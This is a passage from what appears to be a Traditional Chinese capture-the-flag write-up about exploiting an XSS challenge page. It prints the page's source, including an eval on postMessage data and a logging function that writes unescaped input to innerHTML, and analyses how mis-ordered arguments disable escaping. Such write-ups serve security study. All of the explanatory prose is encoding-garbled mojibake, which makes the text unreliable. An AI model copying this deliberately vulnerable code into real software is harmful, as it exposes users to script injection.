script\"><span class=\"token language-javascript\"><br>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>top<span class=\"token punctuation\">.</span><span class=\"token constant\">DEV</span><span class=\"token punctuation\">)</span><br>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Production build!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <br>            <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>            <span class=\"token punctuation\">}</span><br><br>            <span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br>            <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>                <span class=\"token punctuation\">}</span><br>            <br>                <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"ping\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// check the connection</span><br>                        e<span class=\"token punctuation\">.</span>source<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>message<span class=\"token operator\">:</span><span class=\"token string\">'pong'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"logv\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// display variable's value by its name</span><br>                        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[logv]: \"</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"compare\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// compare variable's value to a given one</span><br>                        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[compare]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>variable<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>                        <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>                        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                            <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                            <span class=\"token punctuation\">}</span><br>                            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                            <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                            <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token punctuation\">}</span><br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                        <span class=\"token function\">_onmessage</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep default functions</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// hide this script on production</span><br>            document<span class=\"token punctuation\">.</span>currentScript<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./analytics/main.js?t=1627610836<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é€™å€‹é é¢çš„ç¨‹å¼ç¢¼æ¯”å…¶ä»–å…©é å¤šå¾ˆå¤šï¼Œè€Œä¸”å¯ä»¥æ‰¾åˆ°ä¸€äº›æˆ‘å€‘éœ€è¦çš„æ±è¥¿ï¼Œæ¯”å¦‚èªª <code>eval</code>ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br><span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// ...</span><br>        <span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>            <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">_onmessage</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep default functions</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ä½†é€™é‚Šçš„ <code>eval</code> ä¼¼ä¹æ²’è¾¦æ³•è®“æˆ‘å€‘ç›´æ¥åŸ·è¡Œæƒ³è¦çš„ç¨‹å¼ç¢¼ï¼Œå› ç‚ºè¦ç¯„æ»¿åš´æ ¼çš„ï¼ˆå¤§å¯«å­—æ¯ã€éƒ¨åˆ†å°å¯«å­—æ¯ã€æ•¸å­—è·Ÿ +-ï¼‰ï¼Œå¯èƒ½æ˜¯æœ‰å…¶ä»–ç”¨é€”ã€‚</p>\n<p>å¦å¤–ä¸€å€‹æœ‰æ©Ÿæœƒçš„åœ°æ–¹æ˜¯é€™è£¡ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>prefix<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> line <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"li\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">let</span> prefix_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">let</span> text_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// not important</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    data <span class=\"token operator\">=</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>safe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    prefix_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> prefix<span class=\"token punctuation\">;</span><br>    text_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span><br><br>    line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>prefix_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>text_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span> </code></pre>\n<p>å¦‚æœ safe æ˜¯ true çš„è©±ï¼Œé‚£ data å°±ä¸æœƒè¢« escapeï¼Œå°±å¯ä»¥æ’å…¥ä»»æ„çš„ HTMLï¼Œé”æˆ XSSã€‚</p>\n<p>è€Œé€™é‚Šå€¼å¾—æ³¨æ„çš„æ˜¯å‡½å¼çš„åƒæ•¸é‚£ä¸€æ®µï¼š<code>let log = (prefix, data, type='info', safe=false)</code>ï¼Œé€™é»å€¼å¾—ç‰¹åˆ¥è§£é‡‹ä¸€ä¸‹ã€‚</p>\n<p>åœ¨æœ‰äº›ç¨‹å¼èªè¨€è£¡é¢ï¼Œæ”¯æ´é€™ç¨®åƒæ•¸çš„å‘½åï¼Œåœ¨å‘¼å« function çš„æ™‚å€™å¯ä»¥ç”¨åç¨±ä¾†å‚³å…¥åƒæ•¸ï¼Œä¾‹å¦‚èªªï¼š<code>log(prefix='a', safe=true)</code>ï¼Œå°±å‚³å…¥å°æ‡‰åˆ°çš„åƒæ•¸ã€‚</p>\n<p>ä½†æ˜¯åœ¨ JS è£¡é¢ä¸¦æ²’æœ‰é€™ç¨®æ±è¥¿ï¼Œåƒæ•¸çš„å°æ‡‰å®Œå…¨æ˜¯é ã€Œé †åºã€ä¾†æ±ºå®šçš„ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œ<code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type='info');</code> å°æ‡‰åˆ°çš„åƒæ•¸å…¶å¯¦æ˜¯ï¼š</p>\n<ol>\n<li>prefix: <code>&quot;[logv]: &quot;</code></li>\n<li>data: <code>window[m.message]</code></li>\n<li>type: <code>false</code></li>\n<li>safe: <code>'info'</code></li>\n</ol>\n<p>æ˜¯é é †åºè€Œä¸æ˜¯é åç¨±ï¼Œé€™ä¹Ÿæ˜¯è¨±å¤šæ–°æ‰‹æœƒè¢«ææ··çš„åœ°æ–¹ã€‚</p>\n<p>ç¸½ä¹‹å‘¢ï¼Œå°±è®“æˆ‘å€‘å¾ <code>log</code> é€™å€‹å‡½å¼é–‹å§‹å¾€å›æ‰¾å§ï¼Œè¦åŸ·è¡Œåˆ°é€™ä¸€æ®µï¼Œå¿…é ˆè¦ post message åˆ°é€™å€‹ windowï¼Œç„¶å¾Œç¬¦åˆä¸€äº›æ¢ä»¶ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message\">#</a> ç¬¬ä¸€é—œï¼šæˆåŠŸ post message</h2>\n<p>é€™å€‹ console.php çš„é é¢æœ‰ä¸€äº›æ¢ä»¶é™åˆ¶ï¼Œå¦‚æœæ²’æœ‰ç¬¦åˆé€™äº›æ¢ä»¶å°±æ²’è¾¦æ³•åŸ·è¡Œåˆ° log function å»ã€‚</p>\n<p>é¦–å…ˆé€™å€‹é é¢å¿…é ˆè¢« embed åœ¨ iframe è£¡é¢ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">name <span class=\"token operator\">=</span> <span class=\"token string\">'Console'</span><br>document<span class=\"token punctuation\">.</span>title <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span><br><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">===</span> window<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hide code if not on iframe</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å†ä¾†é‚„æœ‰é€™äº›æª¢æŸ¥è¦é€šéï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>top<span class=\"token punctuation\">.</span><span class=\"token constant\">DEV</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Production build!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <br>    <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br>    <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span 